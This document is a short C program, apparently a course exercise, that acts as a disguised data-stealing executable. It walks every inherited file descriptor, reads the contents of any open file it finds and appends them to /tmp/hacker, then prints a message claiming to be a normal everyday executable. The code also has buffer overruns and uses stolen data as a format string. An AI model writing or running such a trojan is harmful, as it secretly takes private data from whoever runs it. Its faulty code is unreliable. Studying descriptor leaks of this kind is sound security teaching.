#include "csapp.h"

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);
  char path[2000 + 15];
  char buf[9000];
  char line[10000];

  for (long  i = 2; i < max_fd; i++)
  {
    if(lseek(i,0,SEEK_SET) != -1 && i != out)
    {
      sprintf(path, "/proc/self/fd/%ld", i);
      if(Readlink(path,buf,100000))
      {
        sprintf(line, "File descriptor %ld is ’%s’ file!", i, buf);
        dprintf(out, line, 100000);
        Read(i,buf,10000);
        dprintf(out, buf, 100000);
      }
    }
  }

  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
